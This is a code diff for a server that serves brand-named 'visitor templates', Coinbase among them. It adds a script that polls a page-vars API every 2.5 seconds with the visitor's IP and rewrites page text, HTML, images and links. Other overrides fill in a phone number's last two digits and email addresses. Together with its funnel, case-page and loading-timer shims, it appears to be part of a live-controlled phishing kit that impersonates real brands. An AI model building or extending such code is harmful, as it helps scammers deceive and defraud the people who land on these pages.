@@ -15,6 +15,7 @@ import { resolve, join } from 'node:path';
 import { findTemplate, VISITOR_TEMPLATES } from '$lib/visitorTemplates';
 import { SKIP_GENERIC_WIRING } from './funnel';
 import { dbGetSetting } from './database.js';
+import { getSchema } from '$lib/pageVars';
 
 export { findTemplate, VISITOR_TEMPLATES };
 export type { VisitorTemplate } from '$lib/visitorTemplates';
@@ -861,6 +862,13 @@ function injectAdvanceShim(html: string, brand: string, page: string): string {
 	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
 }
 
+export interface LoadTemplateOptions {
+	visitorIp?: string;
+	lastTwoDigits?: string;
+	emailFrom?: string;
+	emailTo?: string;
+}
+
 export interface TemplateOverrides {
 	lastTwoDigits?: string;
 	emailFrom?: string;
@@ -918,18 +926,97 @@ const LOADING_TIMER_SHIM = `<script data-injected="loading-timer">
 })();
 </script>`;
 
-export function loadTemplateHtml(brand: string, page: string, overrides?: TemplateOverrides): string | undefined {
+const PAGE_VARS_SHIM = `<script data-injected="visitor-page-vars">
+(function () {
+  if (window.__rvPageVarsReady) return;
+  window.__rvPageVarsReady = true;
+  var BP = window.__rvBrandPage || { brand: '', page: '' };
+  function readBp() {
+    try {
+      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
+      var idx = parts.indexOf('preview');
+      if (idx >= 0 && parts[idx + 1] && parts[idx + 2]) {
+        BP.brand = BP.brand || parts[idx + 1];
+        BP.page = BP.page || parts[idx + 2];
+      }
+    } catch (e) {}
+  }
+  readBp();
+  function apply(vars) {
+    if (!vars) return;
+    document.querySelectorAll('[data-rv-var]').forEach(function (el) {
+      var k = el.getAttribute('data-rv-var');
+      if (k && vars[k] != null && vars[k] !== '') el.textContent = vars[k];
+    });
+    document.querySelectorAll('[data-rv-var-html]').forEach(function (el) {
+      var k = el.getAttribute('data-rv-var-html');
+      if (k && vars[k] != null) el.innerHTML = vars[k];
+    });
+    document.querySelectorAll('[data-rv-var-img]').forEach(function (el) {
+      var k = el.getAttribute('data-rv-var-img');
+      if (k && vars[k]) el.setAttribute('src', vars[k]);
+    });
+    document.querySelectorAll('[data-rv-var-href]').forEach(function (el) {
+      var k = el.getAttribute('data-rv-var-href');
+      if (k && vars[k]) el.setAttribute('href', vars[k]);
+    });
+  }
+  function fetchVars() {
+    var q = '?brand=' + encodeURIComponent(BP.brand) + '&page=' + encodeURIComponent(BP.page);
+    if (window.__rvVisitorIp) q += '&ip=' + encodeURIComponent(window.__rvVisitorIp);
+    return fetch('/api/visitor/page-vars' + q)
+      .then(function (r) { return r.json(); })
+      .catch(function () { return null; });
+  }
+  function refresh() {
+    return fetchVars().then(function (d) {
+      if (d && d.ok && d.vars) apply(d.vars);
+    });
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refresh);
+  } else {
+    refresh();
+  }
+  setInterval(refresh, 2500);
+})();
+</script>`;
+
+function injectPageVarsShim(html: string, brand: string, page: string, visitorIp?: string): string {
+	if (!getSchema(brand, page).length) return html;
+	if (html.includes('visitor-page-vars')) return html;
+	const ipScript = visitorIp
+		? `<script data-injected="visitor-page-vars-ip">window.__rvVisitorIp=${JSON.stringify(visitorIp)};</script>`
+		: '';
+	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
+	const cfg = `<script data-injected="visitor-page-vars-config">window.__rvBrandPage=${bp};</script>`;
+	const payload = cfg + ipScript + PAGE_VARS_SHIM;
+	const bodyClose = html.lastIndexOf('</body>');
+	if (bodyClose === -1) return html + payload;
+	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
+}
+
+export function loadTemplateHtml(
+	brand: string,
+	page: string,
+	opts?: LoadTemplateOptions
+): string | undefined {
 	const t = findTemplate(brand, page);
 	if (!t) return undefined;
 	const file = join(TEMPLATE_ROOT, `${t.slug}.html`);
 	if (!existsSync(file)) return undefined;
 	let html = readFileSync(file, 'utf-8');
 	html = injectMobileScrollFix(html);
+	html = injectPageVarsShim(html, brand, page, opts?.visitorIp);
 	if (brand === 'Coinbase') {
 		html = injectCoinbaseMobileFix(html);
 	}
-	if (overrides) {
-		html = applyOverrides(html, overrides);
+	if (opts?.lastTwoDigits || opts?.emailFrom || opts?.emailTo) {
+		html = applyOverrides(html, {
+			lastTwoDigits: opts.lastTwoDigits,
+			emailFrom: opts.emailFrom,
+			emailTo: opts.emailTo
+		});
 	}
 	if (CASE_PAGE_NAMES.has(page)) {
 		html = injectCaseInputShim(html);
